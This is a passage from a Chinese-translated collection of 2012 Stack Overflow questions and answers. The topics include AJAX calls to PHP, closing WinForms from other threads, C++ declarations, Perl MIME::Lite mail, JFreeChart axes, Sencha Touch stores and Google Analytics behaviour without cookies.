}); 
```

例如，我重新定义了硬编码的数据字段，但是，当然，可以在循环中遍历所有字段，而无需在代码中写入其名称。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T16:43:16.437

那么，你有一个非常脾气暴躁的服务器，不是吗？

您可以将其设置为空，但使用

```
fields:[
{
name:'model_id',
type:'int'
useNull:true
}
] 
```

虽然如果 model_id 是一个字符串，它仍然是`''`

你也可以`persist = false`在现场设置，但它不会在更新时保存它

基本上，告诉您的服务器管理员忽略 id 如果它是空的

# php - 将javascript变量传递给PHP函数

> ID：10084689
> 
> 赞同：2
> 
> 时间：2012-04-10T07:21:43.437
> 
> 标签：php, javascript

我有这个 javascript 代码

```
<Script>
    function getGroupId(){
        var group=document.getElementById("selectedOptions").value;
        var groupFirstLetter=group.substring(2);

    }
</Script> 
```

我需要将 传递`groupFirstLetter`给 PHP 函数，该函数将计算该组中有多少用户并将值返回给 javascript 函数。

请问有什么想法吗？

谢谢，

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-10T07:27:38.720

您可以使用 jQuery 来发布 AJAX 请求。请参阅从 jQuery 文档中取出的这个示例：

```
$.ajax({
  type: "POST",
  url: "some.php",
  data: {groupFirstLetter:groupFirstLetter},
  complete: function(data){
            //data contains the response from the php file.
            //u can pass it here to the javascript function
        }
}); 
```

该变量将在您的 PHP 代码中以`$_POST['groupFirstLetter']`. 您可以随意操作它，然后`echo`再次响应浏览器，它将在`data`变量中可用。参考：

[jQuery AJAX](http://api.jquery.com/jQuery.ajax/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T07:25:30.030

由于 javascript 在用户的浏览器上运行，您必须向 php 页面发出 http 请求。POST 或 GET 可用于发送参数。

要使用 javascript 进行 http 调用，请参阅：[HTTP GET request in JavaScript?](https://stackoverflow.com/questions/247483/http-get-request-in-javascript)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-10T07:29:12.237

使用 jQuery (jquery.com)。

使用 ajax 动态加载发送变量的 php 文件，如下所示：

```
$.post("file.php", {variable_name: value}, function(returned_data){
    console.log(returned_data); //or do whatever you like with the variable
}); 
```

并且您的 php 文件将访问该变量：

```
$_POST['variable_name']; 
```

# svn - 向 TortoiseSVN 编写插件

> ID：10084690
> 
> 赞同：6
> 
> 时间：2012-04-10T07:21:44.903
> 
> 标签：svn, plugins, tortoisesvn

是否可以为 TortoiseSVN 编写新插件？

我想编写一个插件在签入之前对文件进行分析，验证（规则集），如果失败，则不应提交文件并应生成报告。

如果 TortoiseSVN 已经存在插件，在哪里查找它们？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-10T14:39:17.010

您可以在例如[预提交客户端挂钩脚本](http://tortoisesvn.net/docs/release/TortoiseSVN_en/tsvn-dug-settings.html#tsvn-dug-settings-hooks)中运行您的测试。

或者您可以实现一个[问题跟踪器插件](http://tortoisesvn.googlecode.com/svn/trunk/doc/notes/issuetrackers.txt)并在那里进行检查。

# c# - 使用 Invoke 方法从外部线程关闭表单

> ID：10084691
> 
> 赞同：4
> 
> 时间：2012-04-10T07:21:45.247
> 
> 标签：c#, multithreading, winforms, invoke

我必须从线程中关闭一个窗体，并且我正在使用窗体的 Invoke 方法来调用 Close() 方法。

问题是，当关闭时，表单被释放，我得到一个 InvalidOperationExecption 和消息“在创建窗口句柄之前不能在控件上调用 Invoke 或 BeginInvoke。”。

只有在 Close 方法中使用“Step Into”进行调试时，我才会遇到此异常，但我不想冒在正常运行时可能出现错误的风险。

这是重现它的示例代码：

```
 private void Form1_Load(object sender, EventArgs e)
 {
     Thread thread = new Thread(CloseForm);
     thread.Start();
 }

 private void CloseForm()
 {
     this.Invoke(new EventHandler(
         delegate
         {
             Close(); // Entering with a "Step Into" here it crashes.
         } 
     ));
 } 
```

该表单位于表单的自动生成代码中（我不想修改）：

```
 protected override void Dispose(bool disposing)
    {
        if (disposing && (components != null))
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    } 
```

如果有人能给我一个解决方案来解决这个问题或其他方式从另一个线程关闭表单，我将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-10-31T14:47:14.103

使用此方法：

```
// Inspired from: http://stackoverflow.com/a/12179408/1529139
public static void InvokeIfRequired(Control control, MethodInvoker action)
{
    if (control.IsDisposed)
    {
        return;
    }

    if (control.InvokeRequired)
    {
        try
        {
            control.Invoke(action);
        }
        catch (ObjectDisposedException) { }
        catch (InvalidOperationException e)
        {
            // Intercept only invokation errors (a bit tricky)
            if (!e.Message.Contains("Invoke"))
            {
                throw e;
            }
        }
    }
    else
    {
        action();
    }
} 
```

使用示例：

```
Functions.InvokeIfRequired(anyControl, (MethodInvoker)delegate()
{
    // UI stuffs
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T19:30:48.283

到目前为止，这种情况的最佳解决方案是使用 SynchronizationContext 机制。我在[是否应该使用 Invoke 或 SynchronizationContext 从另一个线程更新表单控件？](https://stackoverflow.com/questions/7480359/should-i-use-invoke-or-synchronizationcontext-to-update-form-controls-from-anoth).

示例代码如下所示：

```
private void Form1_Load(object sender, EventArgs e)
{
    Thread thread = new Thread(MethodThread);
    thread.Start(SynchronizationContext.Current);
}

private void MethodThread(Object syncronizationContext)
{
    ((SynchronizationContext)syncronizationContext).Send(CloseForm,null);
}

private void CloseForm(Object state)
{
    Close();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T20:16:08.117

今天早上我遇到了类似的情况，我在 Invoke 调用中调用 Close 并在 Close 方法尝试返回时收到 InvalidOperationException。Invoke 方法无法将值返回给调用者，因为它已被释放。为了解决这个问题，我使用了 BeginInvoke，它允许我的线程在表单关闭之前返回。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T08:00:09.340

虽然我觉得在没有平台互操作的情况下必须有一种干净的方法来做到这一点，但我想不出它是什么。同时，这里有一些代码显示了一种肯定有效的方法，假设您不介意 p/invoke ...

```
public partial class Form1 : Form
{
    private const uint WM_CLOSE = 0x0010;
    private IntPtr _myHandle;

    public Form1()
    {
        InitializeComponent();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
        var t = new Thread(ThreadProc);
        t.Start();
    }

    protected override void OnHandleCreated(EventArgs e)
    {
        _myHandle = this.Handle;
        base.OnHandleCreated(e);
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll", SetLastError = true)]
    static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    private void ThreadProc(object o)
    {
        Thread.Sleep(5000);
        PostMessage(_myHandle, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-10T07:30:25.960

最明显的评论是 - 没有明显的理由需要在表单完成加载之前关闭它。还有其他更好的方法来处理任何原因。

不过既然你问...

该错误为您提供了答案 - 在构建之前不要关闭。设置表单计时器 - 在所有其他表单创建消息完成之前，不会处理谁的 WM_TIMER 消息。

```
private System.Windows.Forms.Timer _timer;
protected override void OnLoad(EventArgs args)
{
    _timer = new Timer { Interval = 1 };
    _timer.Tick += (s, e) => new Thread(CloseForm).Start();
    _timer.Start();

    base.OnLoad(args);
} 
```

# android - AndEngine 更新线程对大型精灵工作缓慢

> ID：10084697
> 
> 赞同：0
> 
> 时间：2012-04-10T07:21:55.603
> 
> 标签：android, andengine

我创建了纹理大小为 2048X1024 的精灵并附加到我的场景中。事情进展顺利，但问题是当我将任何其他精灵与场景连接时，它需要时间来显示。如果没有这个更大的精灵，事情就会显示出来，而不会有任何明显的延迟。当我附上这个更大的精灵时，其他附件开始有时间显示我正在研究 AndEngine 如果有人解决了这类问题，请帮忙谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T17:01:31.583

我无法弄清楚为什么您需要在屏幕上显示该尺寸的图像。问题是 Android 将图像大小限制在 1024 x 1024 左右，因此 AndEngine 很可能会换出不同的图像。在没有看到您的代码或不知道您要做什么的情况下，我没有什么可以建议的。除了将您的大图像分解为小于 1024 x 1024 的图像。如果您正在玩游戏并将图像用作背景，我建议您使用一个名为“Tiled”的程序并使用它在 AndEndine 中加载它TMX 加载器。AndEngine 论坛上有一个教程。

# android - 如何使用图像处理从 Android 中的图像中检测整数值？

> ID：10084700
> 
> 赞同：0
> 
> 时间：2012-04-10T07:22:07.697
> 
> 标签：android, image-processing, bitmap, integer

嗨，我需要使用图像处理从图像中找到整数值我经历了一些图像处理算法，例如边缘检测，但没有得到解决方案，任何人都可以展示一些从图像中检测整数值的示例吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:29:34.007

对于图像识别和类似的东西，我们通常使用[神经网络](http://en.wikipedia.org/wiki/Neural_network)。实现一个基本的神经网络并不难，但在野外有无数的实现（原生 C/C++ 和 Java 也是如此）。

我强烈建议使用[OpenCV](http://opencv.willowgarage.com/wiki/)库，它有点复杂，但可以让你做更高级的事情。

注意：有一个适用于 Android 的端口，您可以在这里找到它：[OpenCV 4 Android](http://code.opencv.org/projects/opencv/wiki/OpenCV4Android)

# javascript - 为什么 .innerHTML 在 xmlhttp.open() 和 .send() 之前更改？

> ID：10084703
> 
> 赞同：0
> 
> 时间：2012-04-10T07:22:13.810
> 
> 标签：javascript, ajax, xmlhttprequest

我正在学习使用 xmlhttprequest/AJAX。在 w3schools 的这个示例代码中，我不明白为什么这行：

```
document.getElementById("myDiv").innerHTML=xmlhttp.responseText; 
```

在此之前：

```
 xmlhttp.open("GET","demo_get.asp",true);
 xmlhttp.send(); 
```

我正在考虑的方式是，您应该在有任何 responseText 做任何事情之前发送 GET 请求。我的理解错误在哪里？

```
<html>
<head>
<script type="text/javascript">
function loadXMLDoc()
{
var xmlhttp;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
    }
  }
xmlhttp.open("GET","demo_get.asp",true);
xmlhttp.send();
}
</script>
</head>
<body>

<h2>AJAX</h2>
<button type="button" onclick="loadXMLDoc()">Request data</button>
<div id="myDiv"></div>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:24:27.570

有问题的行在内部`xmlhttp.onreadystatechange`，这是一个函数。注意它是如何使用的：

```
xmlhttp.onreadystatechange = function ()
{
    ...
} 
```

在这种情况下，它是一个回调函数——它在 ajax 请求（又名`xmlhttp.send()`）完成时被调用。

在深入研究 ajax 之前，您可能想复习一下您的 javascript。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T08:50:40.763

您刚刚发现了 AJAX 词的**异步**部分 :-)

即使`.send()`稍后调用该方法，该`innerHTML`调用也会更早进行。

这怎么行？！

因为 AJAX 调用是**异步**的。因此，它不像在 PHP 中进行数据库调用：您进行调用，等待结果，然后使用它。没有。

在 JS 中，对于 AJAX 调用，您定义了一个*回调*函数。*这是一个在响应到达*后将被调用的函数。

对于 XMLHttpRequest 对象，它是`onreadystatechange`响应返回时触发的事件。如果你在这个事件中注册一个函数，这个函数会*在响应回来时*被调用。

PS：`onreadystatechange`一旦响应返回，函数 in 将不会被完全触发，但这是为了解释。要了解此事件何时触发，请查看[不同的 states](https://developer.mozilla.org/en/XMLHttpRequest#readyState)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-10T07:25:08.130

它没有。考虑这段代码：

```
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
    }
  } 
```

它不执行函数内部的代码，它只创建函数并将其分配给一个属性。当状态发生变化时，该函数将由 XMLHTTP 对象执行，它会捕捉到表示响应已到达的状态变化。

# c# - 如何从 ListView 中的 DropDownList 获取值？

> ID：10084709
> 
> 赞同：1
> 
> 时间：2012-04-10T07:22:41.143
> 
> 标签：c#, asp.net, listview

我在 ListView 中有一个 DropDownList 。我想在单击命令时获取数据。这是我的代码..

```
protected void ListView2_ItemCommand(object sender, ListViewCommandEventArgs e){

string shipmethod = ((DropDownList)e.Item.FindControl("ShippingComapnyDDL")).SelectedValue;

} 
```

但它总是返回空值..我用谷歌搜索了大约 3 个小时，并尝试了很多功能..但仍然无法解决这个错误..

请帮帮我，伙计们，

**更新** 这是我的 aspx 页面

```
 <asp:DropDownList ID="ShippingComapnyDDL"  runat="server" SelectedValue='<%# Eval("ShippingCompany") %>'>
<asp:ListItem Text="" Value=""></asp:ListItem>
<asp:ListItem Text="FedEx" Value="FedEx"></asp:ListItem>
<asp:ListItem Text="UPS" Value="UPS"></asp:ListItem>
<asp:ListItem Text="Other" Value="Other"></asp:ListItem>
</asp:DropDownList> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:29:31.793

尝试这个：

```
 DropDownList ddl = (DropDownList)e.Item.FindControl("ShippingComapnyDDL");
  if (ddl != null)
  {
       //code here
  } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T08:11:23.863

请试试

```
<%#DataBinder.Eval(Container.DataItem,"ShippingCompany")%> 
```

代替

```
<%#Eval("ShippingCompany")%> 
```

**更多细节：**

[http://aspadvice.com/blogs/joteke/archive/2008/08/24/Is-_2200_Databinding-methods-such-as-Eval_280029002C00_-XPath_280029002C00_-and-Bind_28002900_-can-only-be-used-in-the-数据绑定控制的上下文_2E002200_-causing-you-grief_3F00_.aspx](http://aspadvice.com/blogs/joteke/archive/2008/08/24/Is-_2200_Databinding-methods-such-as-Eval_280029002C00_-XPath_280029002C00_-and-Bind_28002900_-can-only-be-used-in-the-context-of-a-databound-control_2E002200_-causing-you-grief_3F00_.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:26:57.787

你有设置标题吗？试试

```
 if(e.Item.ItemIndex!=-1)
{
     string shipmethod = ((DropDownList)e.Item.FindControl("ShippingComapnyDDL")).SelectedValue; 
}

if not working then try     
string shipmethod = (e.Item.FindControl("ShippingComapnyDDL") as DropDownList).SelectedValue; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2022-02-22T09:29:13.620

```
<asp:ListView ID="lvwCoreConfigureData" runat="server" DataKeyNames="Course_Config_Id" OnItemCommand="lvwCore_Config_ItemCommand" OnItemDataBound="lvwCore_Config_ItemDataBound">
            <LayoutTemplate>
                <table class="table mobile-stacked mb-0">
                    <thead>
                        <tr role="row">

                            <th style="width: 240px">
                                <asp:Label runat="server" Text="<%$Lang:Resource.Core_Config_Course %>"></asp:Label>
                            </th>

                        </tr>
                    </thead>
                    <tbody>
                        <tr runat="server" id="itemPlaceholder" />
                    </tbody>
                </table>
            </LayoutTemplate>

            <ItemTemplate>
                <tr role="row">

                    <td data-th="Name">
                    <asp:DropDownList ID="ConfigCourseName" runat="server" AutoPostBack="true" CssClass="form-control" OnSelectedIndexChanged="ConfigCourseName_SelectedIndexChanged"></asp:DropDownList>
                    </td>

                </tr>
            </ItemTemplate>

        </asp:ListView> 
```

2\. 此方法将在编辑模式下提供数据绑定到下拉列表

```
protected void lvwCore_Config_ItemDataBound(Object sender, ListViewItemEventArgs e)
                        {
                            if (e.Item.ItemType == ListViewItemType.DataItem)
                            {
                                ListViewDataItem dataItem = (ListViewDataItem)e.Item; // load one row item

                                var CourseId = ((Edulearn.Model.CoreProgramme.CoreProgrammeConfigrationDM)dataItem.DataItem).CourseId; //

                                DropDownList ConfigCourseName = (e.Item.FindControl("ConfigCourseName") as DropDownList);
                                ConfigCourseName.DataSource = CoreProgrammeRepository.GetCoreProgrammeCourseList(TimeZoneId, new { Name = "TEST" }); // Get the data to dropdown (all data)
                                ConfigCourseName.DataTextField = "Name"; // assign here which one need to display
                                ConfigCourseName.DataValueField = "CourseId"; // assign here which one is the value for database save 
                                ConfigCourseName.DataBind(); // bind the data
                                ConfigCourseName.SelectedValue = CourseId.ToString(); // Here selected values from database will be added 
                                ConfigCourseName.Items.Insert(0, new ListItem("Please select")); // Default value only for display

                            }
                        } 
```

# c++ - C++中“int a();”的作用是什么？

> ID：10084710
> 
> 赞同：1
> 
> 时间：2012-04-10T07:22:46.167
> 
> 标签：c++

`int a();`在 C++ 中的作用是什么？

是否等价于`int a`或`int a(0)`？

`char c()`和怎么样`double d()`？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-10T07:27:04.587

> `int a();`在 C++ 中的作用是什么？

这声明了一个没有参数的函数，它返回一个整数。

> 是否等价于`int a`或`int a(0)`？

不。这些中的每一个都声明了一个整数类型的变量；第二个也用零值初始化它。

> `char c()`和怎么样`double d()`？谢谢。

它们还声明了具有不同返回类型的函数。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-10T07:27:11.233

`int a();`是一个函数声明。

`int a`声明`a`为 type `int`。

`int a(0)`将 a 声明为 type`int`并将其初始化为`0`.

`char c()`和`double d()`是函数声明也分别返回`char`和`double`。

所有函数声明都应以`;`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-10T07:27:33.867

两者都没有，它声明了一个函数。

# perl - 无法使用 perl Mime::Lite 发送邮件

> ID：10084715
> 
> 赞同：1
> 
> 时间：2012-04-10T07:23:02.797
> 
> 标签：perl

我无法使用 MIME::Lite 发送邮件。从我的桌面发送时，它会出现以下错误。错误：“SMTP 无法连接到邮件服务器：文件描述符错误”

我正在使用下面提到的代码。

```
use strict;
use MIME::Lite;
use Net::SMTP;

my $from_address = "no-reply@host.com";
my $to_address = "madhan@host.com";
my $cc_address = "madhan@host.com";
my $subject = "Test mail";
my $message_body = "Madhan test mail";
my $namer="madhankumar";
my $regards="Madhan M";

print " Sending mail from $from_address to $to_address \n";
my $person_name=ucfirst($namer).",";
my $mail_host = 'mail1.somehost.com';

my $msg = MIME::Lite->new (
  From => $from_address,
  To => $to_address,
  Cc => $cc_address,
  Subject => $subject,
  Type =>'multipart/mixed'
) or die "Error creating multipart container: $!\n";

$msg->attach (
  Type => 'TEXT',
  Data => "Dear $person_name\n\n".$message_body."\n\nRegards,\n$regards"
) or die "Error adding the text message part: $!\n";

MIME::Lite->send('smtp', $mail_host, Timeout=>60);
  $msg->send; 
```

当邮件服务器与 LAN 连接时，上述代码工作正常。在远程系统中使用代码时，已引发错误，如下所述

```
"SMTP Failed to connect to mail server: Bad file descriptor". 
```

我可以知道原因.. 代码是否在远程系统中运行。如果不是我对代码所做的更改..请分享您的解决方案....

提前致谢...

注意：我在 Windows XP 中开发这个

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-10T08:42:04.693

变量不包含您认为它们包含的内容。如果您打开了警告，您会自己注意到这一点。

```
$ perl -e'use warnings; my $from_address = "no-reply@host.com";'
Possible unintended interpolation of @host in string at -e line 1.
Name "main::host" used only once: possible typo at -e line 1. 
```

补救方法是使用单引号来分隔这些字符串。

# java - 将字符串值映射到相应的格式

> ID：10084716
> 
> 赞同：0
> 
> 时间：2012-04-10T07:23:02.890
> 
> 标签：java

我必须处理许多字符串（数千个），它们采用以下两种格式之一：

```
============= Examples of Str=============
123|S|122.14, 
S,344,122.146 

==============================================
The format of these strings are 
A|B|C 
B,A,C 
```

我希望他们`A=123 B=S C=122.14`

和`A=344`, `B=S`, `C=122.146` （其中 A , B , C 对应列名，可以加载到 sql server db 中）

我该怎么做呢。

我可以使用 split 将子字符串作为值。如何将这些值与格式映射并加载它们？

请帮忙。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:26:36.370

您可以执行以下操作：

```
String str = "123|S|122.14,";
String[] tokens = str.split("[|,]");
String A;
String B;
String C;
if(tokens[0].equalsIgnoreCase("S"))
{
    A = tokens[1];
    B = tokens[0];
    C = tokens[2];
}
else            
{
    A = tokens[0];
    B = tokens[1];
    C = tokens[2];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T09:13:05.683

```
String[] ABC; 
if( line.contains( '|' ) ) {
   ABC = str.split( "|" ); 
} else {
   String[] split = str.split( "," ); 
   ABC = new Object[] { split[1], split[0], split[2] ); 
} 
```

# facebook - 按日期检索 Facebook 用户信息

> ID：10084717
> 
> 赞同：0
> 
> 时间：2012-04-10T07:23:08.147
> 
> 标签：facebook, facebook-graph-api

我正在使用以下查询来检索特定的 Facebook 用户墙信息： [https ://graph.facebook.com/MY_USER_ID/feed?access_token=MY_ACCESS_TOKEN](https://graph.facebook.com/MY_USER_ID/feed?access_token=MY_ACCESS_TOKEN)

现在从上面的查询中，我需要列出特定更新时间之后的信息。我有 UTC 格式的日期。说，1333620660

你能建议怎么做吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:31:01.713

您可以使用`since`参数过滤提要。

[https://graph.facebook.com/MY_USER_ID/feed?access_token=MY_ACCESS_TOKEN&since=1333620660](https://graph.facebook.com/MY_USER_ID/feed?access_token=MY_ACCESS_TOKEN&since=1333620660)

**编辑（评论后）：** 同样的，你可以使用`until`参数

[https://graph.facebook.com/MY_USER_ID/feed?access_token=MY_ACCESS_TOKEN&since=1333620660&until=1333620890](https://graph.facebook.com/MY_USER_ID/feed?access_token=MY_ACCESS_TOKEN&since=1333620660&until=1333620890)

参考（分页部分）：http: [//developers.facebook.com/docs/reference/api/](http://developers.facebook.com/docs/reference/api/)

# java - 在 JFreeChart 中将原点从 (0,0) 移动到 (0,50)

> ID：10084723
> 
> 赞同：2
> 
> 时间：2012-04-10T07:23:31.340
> 
> 标签：java, graph, jfreechart, linechart

如图所示，该图来自 y=0 线，这里我想从 y=50 绘制一个图，我该如何指定`JFreeChart`呢？ ![JFreeChart](../Images/9aa515383d375f02c395e81133b962a7.png)

这是一些代码：

```
public class Profile  {

    double last=0;
    public void generateProfile(int[] pointValue,double[] distance){
        ArrayList pv=new ArrayList();
        ArrayList dist=new ArrayList();

        pv.add(pointValue);
        dist.add(distance);
        for(int i=0;i<pv.size();i++){
            System.out.print(pointValue[i]);
        }
        for(int i=0;i<dist.size();i++){
            System.out.print(distance[i]);
        }

        XYSeries series = new XYSeries("Average Weight");
        for(int i=0;i<pointValue.length;i++){
            if(pointValue[i]!=0){

              series.add(last,pointValue[i]);
              last=distance[i];
            }
         }

      XYDataset xyDataset = new XYSeriesCollection(series);
      JFreeChart chart;

      chart= ChartFactory.createXYAreaChart("Profile View Of Contour", "Distance", "Contour Value", xyDataset, PlotOrientation.VERTICAL, true, true, false);
      ChartFrame frame1=new ChartFrame("XYLine Chart",chart);
      frame1.setVisible(true);
      frame1.setSize(300,300);
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T16:21:43.887

您可以使用 ValueAxis 类的 setLowerBound() 方法指定 Y 轴的底部值。

使用您的示例：

```
JFreeChart chart;
chart = ChartFactory.createXYAreaChart("Profile View Of Contour", "Distance", "Contour Value", xyDataset, PlotOrientation.VERTICAL, true, true, false);

ValueAxis rangeAxis = chart.getXYPlot().getRangeAxis();
rangeAxis.setLowerBound(50.0f); 
```

# ios - 以编程方式区分系统进程和用户启动的进程（例如，游戏进程）的方法

> ID：10084727
> 
> 赞同：1
> 
> 时间：2012-04-10T07:23:55.077
> 
> 标签：ios, process

如何以编程方式区分系统进程和用户启动的进程（例如，游戏进程）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-14T22:02:17.583

我必须解决一个类似的问题，并以与此处基本相同的方式获取进程列表：[我可以使用 `sysctl` 来检索用户的进程列表吗？](https://stackoverflow.com/questions/7729245/can-i-use-sysctl-to-retrieve-a-process-list-with-the-user). 我通过查找与我当前应用程序名称匹配的进程来获取当前用户 ID，然后丢弃所有具有不同用户 ID 的进程。这似乎摆脱了大约 1/2 的系统进程。

丢弃 pid 小于 100 的任何进程似乎可以摆脱几乎所有其他系统进程，而我剩下的看起来相当不错。还剩下一些系统进程，我想我会直接忽略它们的名称。（虽然我不确定它们是否只是因为我正在手机上调试。）

# sencha-touch - 如何从 Sencha MVC 方法中创建的表中获取数据？

> ID：10084728
> 
> 赞同：0
> 
> 时间：2012-04-10T07:24:01.137
> 
> 标签：sencha-touch, extjs

我的数据库中有一个表。我正在将行添加到创建的数据存储中。

```
var journal_db = [];
var db; 
```

这是我的数据存储：

```
Ext.define('iPolis.store.journalStore', {
extend: 'Ext.data.Store',

requires: 'Ext.DateExtras',

config: {

    model: 'iPolis.model.journal',

    data : journal_db

}
}); 
```

我正在将行添加到我的数据存储中，如下所示：

```
for (var i=0; i < results.rows.length; i++){
          row = results.rows.item(i);
        journalStore.add({'id':row['id'],'infoLine':row['infoLine'],'eventDate':row['eventDate'],'address':row['address'],'text':row['text'],'place':row['place']});

  } 
```

它给了我一个参考错误 Uncaught ReferenceError: journalStore is not defined。谁能帮我将行添加到数据存储区？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T10:24:36.810

您需要在使用它之前创建商店实例

```
var journalStore = Ext.create('iPolis.store.journalStore');
for (var i=0; i < results.rows.length; i++) {
     journalStore.add(results.rows.item(i));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T09:47:21.837

在这里，Sencha Touch 理解`journalStore`为一个变量。我在任何地方都看不到它……所以也许它真的没有定义。

要获取您的商店，只需在您的商店定义中添加一个 id，例如：`id: 'journal-store'`并且只要您想获得它，只需使用`Ext.getStore('journal-store')`.

希望能帮助到你。

PS：如果你的 Store 不是自动创建的（通过其他组件的配置，例如 Ext.List），你必须显式创建它。添加

`journalStore = Ext.create('iPolis.store.journalStore');`

它应该可以工作。

# javascript - 如果在我的浏览器中禁用 cookie，Google Analytics 会跟踪流量吗？

> ID：10084732
> 
> 赞同：6
> 
> 时间：2012-04-10T07:24:11.217
> 
> 标签：javascript, google-analytics

我想知道如果我的浏览器禁用了 cookie，谷歌分析是否会跟踪我网站上的流量？

我试图在谷歌上搜索，但找不到关于这个问题的太多信息。

如果您还可以为我提供源链接，我将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-18T23:49:47.120

答案似乎是肯定的，下面是谷歌要说的。

“测量协议”甚至可以在没有 cookie 或 js 的情况下工作，它似乎处于测试阶段，因此您必须请求访问。

> Universal Analytics 支持没有浏览器 cookie 的数据收集。Universal Analytics 收集方法（[analytics.js](https://developers.google.com/analytics/devguides/collection/analyticsjs/)和[Measurement Protocol](https://developers.google.com/analytics/devguides/collection/protocol/v1/)）可以在没有 cookie 的情况下实施并用于收集访问者使用数据。如果 cookie 被清除或禁用，这些方法也可以工作。不希望 Google Analytics 报告其访问数据的网站访问者可以安装 Google Analytics 退出浏览器插件以退出。

来源： http: [//support.google.com/analytics/bin/answer.py ?hl=en&answer=2838718](http://support.google.com/analytics/bin/answer.py?hl=en&answer=2838718)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-11T16:19:16.753

不，如果您禁用 cookie，Google Analytics 将不会跟踪您。

谷歌分析通过创建 cookie（或使用它找到的现有 cookie）来跟踪您。然后它在发送到的请求中使用该 cookie 信息`http://google-analytics.com/__utm.gif`。获取数据的“请求”`__utm.gif`就是将数据传输到 Google Analytics 的方式。

谷歌搜索这有点困难，因为它主要只是显示 cookie 本身的信息，而不是禁用它们时会发生什么。

所以，我做了一个实验来证明这一点。我在禁用 cookie 的全新 FireFox 安装中加载了 StackOverflow。

以下是 HTTP 请求列表。请注意，它会加载`ga.js`尝试跟踪您的 Google Analytics（分析）脚本。但是，没有提出任何要求`__utm.gif`。ga.js 只是运行，意识到它无法创建 cookie，因此无法创建从一个页面浏览到另一个页面浏览的“状态”。

![在此处输入图像描述](../Images/a203a2153214dd6974d6b77ecedf56b4.png)

如果没有 cookie，Google Analytics 会将每一次“点击”视为自己的访问，而每次访问都将是一次反弹。这些数据将毫无用处。因此，GA 做出了不追踪这些人的合理选择。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T23:46:05.257

感谢您的解释，但我认为 cookie 或没有 cookie 分析仍会记录访问，但无法跟踪。因此，当您说“Google Analytics（分析）会将每一次“点击”视为自己的访问时，这些访问中的每一次都将是一次反弹。” 您是否暗示这仍被记录为 0 秒或 100% 反弹访问？或者 Analytics 根本没有记录访问？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-04-22T06:35:14.923

它可以，但前提是网站所有者以这种方式设置它，这很困难。问题是在维护 UUID 的同时跨不同 URL 跟踪用户。

简短的回答是肯定的——但前提是网站所有者找到了绕过陷阱的方法。

我在我的网站上做了。

# c# - Wpf 服务器/客户端登录。事件问题

> ID：10084741
> 
> 赞同：0
> 
> 时间：2012-04-10T07:24:49.663
> 
> 标签：c#, wpf, wcf, event-handling

我对编程很陌生，所以如果我的问题不够具体，请耐心等待。现在我正在尝试对我的服务器进行简单的客户端登录。所以服务端 App 知道连接了哪些用户。当客户端连接时，我希望在更新用户列表的服务器上触发一个事件。但它没有，我不知道为什么。希望你能帮忙。

在代码中，我删除了用户在 serverApp 中的显示方式。现在我只需要这个活动来工作。

**在我的服务库中：**

INetworkService 合同：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.ServiceModel;
using System.Text;

namespace NetworkLib
{
    [ServiceContract]
    public interface INetworkService
    {
        [OperationContract]
        void Logon(UserInfo userInfo);

        [OperationContract]
        void Logout();
    }
} 
```

网络服务类：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.ServiceModel;
using System.Text;

namespace NetworkLib
{
    public class NetworkService : INetworkService
